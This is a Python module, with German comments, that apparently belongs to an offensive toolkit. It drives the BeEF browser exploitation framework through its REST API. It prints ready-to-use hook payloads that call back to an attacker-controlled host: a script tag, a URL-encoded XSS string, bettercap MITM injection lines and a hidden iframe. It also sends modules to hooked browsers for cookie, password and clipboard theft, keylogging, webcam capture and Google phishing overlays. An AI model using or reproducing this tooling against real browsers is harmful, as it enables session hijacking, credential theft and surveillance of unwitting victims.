"""
BeEF (Browser Exploitation Framework) Integration.

BeEF hookt Browser über eine JavaScript-Zeile und erlaubt dann:
  - Keylogger im Browser
  - Screenshots via JavaScript
  - Webcam via Browser-API
  - Passwörter aus gespeicherten Formularen
  - Netzwerk-Scan vom Browser aus
  - Phishing-Dialoge im Browser
  - Session-Hijacking
  - Redirect auf andere Seiten

Voraussetzung: beef-xss auf Kali installiert
  apt-get install beef-xss  ODER  apt-get install beef

BeEF REST API läuft auf http://127.0.0.1:3000/api/
"""

from __future__ import annotations
import asyncio
import json
from dataclasses import dataclass, field
from typing import AsyncGenerator

from core.runner import CommandRunner, check_tool
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="BeEF Engine",
    description=(
        "Browser Exploitation Framework — hookt Browser via JavaScript, "
        "ermöglicht Keylogger, Screenshots, Webcam, Passwort-Harvest, Netzwerk-Scan."
    ),
    usage="BeEF starten, Hook-URL in Ziel-Seite einbetten oder via MITM injizieren.",
    danger_note="⛔ BLACK — nur auf autorisierten Systemen.",
    example="Hook: <script src='http://<kali-ip>:3000/hook.js'></script>",
)

DANGER = DangerLevel.BLACK

BEEF_API   = "http://127.0.0.1:3000/api"
BEEF_PASS  = "beef"   # Standard-Passwort (in /etc/beef-xss/config.yaml änderbar)

# BeEF Command IDs (stabile IDs aus BeEF-Source)
COMMANDS = {
    "get_cookie":        {"id": 1,   "label": "Cookies lesen",           "module": "network/get_cookie"},
    "get_page_html":     {"id": 3,   "label": "Seiten-HTML dumpen",       "module": "debug/return_ascii_chars"},
    "get_localStorage":  {"id": 4,   "label": "localStorage lesen",       "module": "browser/hooked_domain/get_local_storage"},
    "get_sessionStorage":{"id": 5,   "label": "sessionStorage lesen",     "module": "browser/hooked_domain/get_session_storage"},
    "screenshot":        {"id": 63,  "label": "Screenshot (canvas)",      "module": "browser/hooked_domain/take_screenshot"},
    "webcam":            {"id": 100, "label": "Webcam Snapshot",          "module": "social_engineering/webcam"},
    "keylogger":         {"id": 126, "label": "Keylogger starten",        "module": "network/keylogger"},
    "saved_passwords":   {"id": 185, "label": "Gespeicherte Passwörter",  "module": "browser/hooked_domain/stored_credentials"},
    "scan_network":      {"id": 68,  "label": "Netzwerk-Scan (vom Browser)", "module": "network/internal_network_fingerprinting"},
    "clipboard":         {"id": 188, "label": "Clipboard lesen",          "module": "browser/hooked_domain/get_clipboard"},
    "alert_dialog":      {"id": 12,  "label": "Alert-Dialog anzeigen",    "module": "browser/hooked_domain/alert_dialog"},
    "fake_notification": {"id": 199, "label": "Fake Browser-Notification","module": "social_engineering/fake_notification_bar"},
    "redirect":          {"id": 42,  "label": "Browser umleiten",         "module": "browser/hooked_domain/redirect_browser"},
    "create_alert":      {"id": 12,  "label": "Popup mit Text",           "module": "browser/hooked_domain/alert_dialog"},
    "get_geolocation":   {"id": 52,  "label": "GPS-Standort (wenn erlaubt)", "module": "geolocation"},
    "social_google":     {"id": 201, "label": "Google Phishing-Overlay",  "module": "social_engineering/google_phishing"},
}


def _curl_get(path: str, token: str) -> list[str]:
    return ["curl", "-sk", f"{BEEF_API}{path}?token={token}"]


def _curl_post(path: str, token: str, data: dict) -> list[str]:
    return [
        "curl", "-sk", "-X", "POST",
        "-H", "Content-Type: application/json",
        "-d", json.dumps(data),
        f"{BEEF_API}{path}?token={token}",
    ]


async def _get_token() -> str:
    """Login und API-Token holen."""
    cmd = [
        "curl", "-sk", "-X", "POST",
        "-H", "Content-Type: application/json",
        "-d", json.dumps({"username": "beef", "password": BEEF_PASS}),
        f"{BEEF_API}/admin/login",
    ]
    token = ""
    async for line in CommandRunner().run(cmd):
        try:
            data = json.loads(line)
            token = data.get("token", "")
        except Exception:
            pass
    return token


class BeEFEngine:

    async def start_beef(self) -> AsyncGenerator[str, None]:
        yield "[*] Starte BeEF..."
        if not await check_tool("beef-xss"):
            yield "[!] beef-xss nicht installiert."
            yield "[*] Installieren: apt-get install beef-xss -y"
            return

        # beef-xss startet im Hintergrund
        async for line in CommandRunner().run(
            ["beef-xss", "--background"], timeout=5
        ):
            if line.strip():
                yield f"    {line}"

        await asyncio.sleep(3)

        # Token holen um Verbindung zu prüfen
        token = await _get_token()
        if token:
            yield "[+] BeEF läuft ✓"
            yield f"[+] Admin-UI: http://127.0.0.1:3000/ui/panel"
            yield f"[+] Hook-URL: http://<KALI-IP>:3000/hook.js"
            yield f"[*] Admin: beef / beef  (in /etc/beef-xss/config.yaml ändern!)"
        else:
            yield "[!] BeEF antwortet nicht. Manuell starten:"
            yield "    beef-xss"
            yield "    Dann http://127.0.0.1:3000/ui/panel öffnen"

    async def get_hook_payloads(self, kali_ip: str) -> AsyncGenerator[str, None]:
        yield f"[*] Hook-Payloads für {kali_ip}:"
        yield ""
        yield f"  {'-'*60}"
        yield f"  HTML-Script-Tag (in Webseite einbetten):"
        yield f"  <script src='http://{kali_ip}:3000/hook.js'></script>"
        yield ""
        yield f"  XSS-Payload (URL-codiert für GET-Parameter):"
        yield f"  %3Cscript%20src%3D'http%3A%2F%2F{kali_ip}%3A3000%2Fhook.js'%3E%3C%2Fscript%3E"
        yield ""
        yield f"  MITM-Injektion via bettercap Caplet:"
        yield f"  set inject.js.src http://{kali_ip}:3000/hook.js"
        yield f"  inject.js on"
        yield ""
        yield f"  Iframe (unsichtbar, 1×1 px):"
        yield f"  <iframe src='http://{kali_ip}:3000/' width='1' height='1' style='display:none'></iframe>"
        yield f"  {'-'*60}"

    async def list_hooked_browsers(self) -> AsyncGenerator[str, None]:
        token = await _get_token()
        if not token:
            yield "[!] BeEF nicht erreichbar. Erst starten (Option 1)."
            return

        yield "[*] Gehookte Browser:"
        yield ""
        async for line in CommandRunner().run(_curl_get("/hooks", token)):
            try:
                data = json.loads(line)
                browsers = data.get("hooked-browsers", {})
                online   = browsers.get("online", {})
                offline  = browsers.get("offline", {})

                if not online and not offline:
                    yield "  [*] Noch kein Browser gehookt."
                    yield "  [*] Hook-URL in Ziel-Browser öffnen oder via MITM injizieren."
                    return

                if online:
                    yield f"  {len(online)} Browser ONLINE:"
                    for sid, b in online.items():
                        yield f"    ► [{sid}]  {b.get('BrowserName','')} {b.get('BrowserVersion','')}  |  {b.get('OsName','')}  |  IP: {b.get('ip','?')}"
                        yield f"          URL: {b.get('CurrentPage','?')}"

                if offline:
                    yield f"\n  {len(offline)} Browser offline:"
                    for sid, b in offline.items():
                        yield f"    · [{sid}]  {b.get('BrowserName','')}  {b.get('ip','?')}"
            except Exception:
                if line.strip():
                    yield f"  {line}"

    async def run_command(
        self, session_id: str, command_key: str, params: dict | None = None
    ) -> AsyncGenerator[str, None]:
        token = await _get_token()
        if not token:
            yield "[!] BeEF nicht erreichbar."
            return

        if command_key not in COMMANDS:
            yield f"[!] Unbekannter Befehl: {command_key}"
            return

        cmd_info = COMMANDS[command_key]
        yield f"[*] Sende Befehl: {cmd_info['label']} → Session {session_id}"

        data = {"module": cmd_info["module"]}
        if params:
            data.update(params)

        cmd_id = None
        async for line in CommandRunner().run(
            _curl_post(f"/modules/{session_id}/{cmd_info['id']}", token, data)
        ):
            try:
                r = json.loads(line)
                cmd_id = r.get("command_id")
                if cmd_id:
                    yield f"[+] Befehl gesendet (ID: {cmd_id}) — warte auf Ergebnis..."
            except Exception:
                pass

        if not cmd_id:
            yield "[!] Befehl konnte nicht gesendet werden."
            return

        # Poll für Ergebnis (max 30s)
        for _ in range(15):
            await asyncio.sleep(2)
            async for line in CommandRunner().run(
                _curl_get(f"/modules/{session_id}/commands/{cmd_id}", token)
            ):
                try:
                    r = json.loads(line)
                    result_data = r.get("data", {}).get("data")
                    if result_data:
                        yield f"[+] Ergebnis:"
                        if isinstance(result_data, str):
                            yield f"  {result_data[:2000]}"
                        else:
                            yield f"  {json.dumps(result_data, indent=2)[:2000]}"
                        return
                except Exception:
                    pass
        yield "[!] Timeout — kein Ergebnis erhalten (Browser evtl. offline)."
